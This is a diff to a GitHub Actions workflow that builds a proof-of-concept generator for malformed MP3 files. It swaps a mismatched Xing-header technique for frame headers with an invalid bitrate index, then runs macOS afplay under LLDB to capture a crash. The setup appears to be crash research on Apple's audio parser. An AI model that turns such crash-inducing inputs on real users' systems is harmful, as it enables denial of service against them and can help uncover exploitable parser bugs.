@@ -19,11 +19,11 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Patch encodeme.mm with the source that creates an invalid MP3
-      - name: Patch encodeme.mm to create invalid MP3
+      # Updated: Patch encodeme.mm with a more aggressive corruption technique
+      - name: Patch encodeme.mm to create a severely invalid MP3
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm with faulty MP3 generation logic..."
+          echo "Patching encodeme.mm to generate a file with an invalid frame header..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
 
@@ -32,7 +32,6 @@ jobs:
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  // Fixed: Removed unused variables from stringWithFormat to resolve compiler warning.
                   NSString *fileName = @"output_invalid.mp3";
                   FILE *file = fopen(fileName.UTF8String, "wb");
                   if (!file) {
@@ -40,31 +39,26 @@ jobs:
                       return 1;
                   }
 
-                  // The core of the issue: Mismatched frame counts
-                  UInt32 totalFrames = 10000; // Inflated value for the header
-                  UInt32 actualFrames = 1000;  // Actual number of frames to be written
-
-                  // Write a misleading Xing header
-                  char xingHeader[100] = {0};
-                  memcpy(xingHeader, "Xing", 4);
-                  xingHeader[7] = 0x01; // Frames field present
-                  xingHeader[8] = totalFrames >> 24;
-                  xingHeader[9] = (totalFrames >> 16) & 0xFF;
-                  xingHeader[10] = (totalFrames >> 8) & 0xFF;
-                  xingHeader[11] = totalFrames & 0xFF;
+                  // New PoC: Write a completely invalid MP3 frame header.
+                  // This header claims to be a valid MP3 frame but contains garbage values
+                  // for bitrate and other fields, which is more likely to cause a parser crash
+                  // than a simple VBR header mismatch.
+                  char invalidFrameHeader[4] = {
+                      (char)0xFF, // Frame sync
+                      (char)0xFA, // Frame sync + MPEG v1, Layer III
+                      (char)0x10, // Invalid bitrate index, no padding, no private bit
+                      (char)0x00  // Other flags
+                  };
                   
-                  // This is the line where the invalid data is written
-                  fwrite(xingHeader, 1, sizeof(xingHeader), file);
-
-                  // Write dummy MP3 frames
-                  char frameHeader[4] = {0xFF, 0xFB, 0x90, 0x00}; // 44.1kHz, 128kbps, stereo
-                  for (UInt32 i = 0; i < actualFrames; ++i) {
-                      fwrite(frameHeader, 1, sizeof(frameHeader), file);
-                      char dummyData[400] = {0}; // Simplified dummy frame data
+                  // Write the invalid header multiple times to create a small file
+                  for (int i = 0; i < 100; ++i) {
+                      fwrite(invalidFrameHeader, 1, sizeof(invalidFrameHeader), file);
+                      // Followed by some garbage data
+                      char dummyData[400] = {0};
                       fwrite(dummyData, 1, sizeof(dummyData), file);
                   }
-                  fprintf(stderr, "PoC: Wrote Xing header with %u frames, but actual frames written was %u\n", totalFrames, actualFrames);
-
+                  
+                  fprintf(stderr, "PoC: Wrote a file with invalid MP3 frame headers.\n");
                   fclose(file);
 
                   time_t endTime = time(NULL);
@@ -88,42 +82,23 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_debug
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # Debug the file generation process itself with LLDB
-      - name: Debug File Generation with LLDB
+      # This step is no longer needed as the new PoC is simpler, but it's harmless to keep
+      - name: Run and Verify File Generation
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          LOG_FILE="generation_debug_log.txt"
-          echo "--- Debugging File Generation Process ---" > $LOG_FILE
-          echo "Timestamp: $(date)" >> $LOG_FILE
+          ./encodeme_debug
+          echo "File 'output_invalid.mp3' generated."
+          ls -l output_invalid.mp3
           
-          echo "Creating LLDB command script..."
-          cat > debug_script.lldb << 'EOF'
-          breakpoint set --file encodeme.mm --line 30
-          run
-          script print("--- Breakpoint Hit: Inspecting variables before fwrite() ---")
-          p totalFrames
-          p actualFrames
-          p xingHeader
-          continue
-          quit
-          EOF
-          
-          echo "Starting LLDB session with script to inspect the invalid header creation..." >> $LOG_FILE
-          lldb -s debug_script.lldb ./encodeme_debug >> $LOG_FILE 2>&1
-            
-          echo "✅ Generation debug log created. Displaying contents:"
-          cat $LOG_FILE
-          
-      # Improved: Launch the player directly under LLDB to catch any startup crashes
+      # Launch the player directly under LLDB to catch any startup crashes
       - name: Launch Player Under LLDB to Catch Startup Crashes
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) ---" > $PLAYER_LOG_FILE
+          echo "--- Debugging Audio Player (afplay) with new invalid file ---" > $PLAYER_LOG_FILE
           echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
           echo "Creating LLDB script to launch and monitor afplay..."
-          # This script will launch afplay. If it crashes, LLDB will stop and provide a backtrace.
           cat > player_debug_script.lldb << 'EOF'
           # Run the process. LLDB will stop if a crash occurs.
           run
@@ -134,20 +109,19 @@ jobs:
 
           echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
           # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
-          # We add '|| true' because afplay is expected to exit with an error, and we don't want this to fail the step.
+          # We add '|| true' because afplay might exit with an error, which we expect.
           lldb -s player_debug_script.lldb -- afplay output_invalid.mp3 >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
 
-      # Upload all artifacts: the invalid MP3 and both debug logs
+      # Upload all artifacts: the invalid MP3 and the player debug log
       - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: audio-and-debug-artifacts
           path: |
             AppleTest/apple-positional-audio-codec-invalid-header-main/output_invalid.mp3
-            AppleTest/apple-positional-audio-codec-invalid-header-main/generation_debug_log.txt
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
